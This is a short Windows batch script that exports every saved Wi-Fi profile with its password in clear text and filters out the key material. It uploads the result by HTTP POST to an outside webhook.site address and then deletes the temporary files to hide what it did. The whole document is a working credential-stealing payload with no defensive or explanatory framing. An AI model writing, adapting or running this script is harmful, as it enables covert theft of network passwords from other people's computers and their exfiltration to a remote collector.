@echo off
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path WL*.xml -Pattern 'keyMaterial' > WiFi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/1d23bb46-4044-4965-a902-f309498606f6 -Method POST -InFile WiFi-PASS
del WiFi* /s /f /q
exit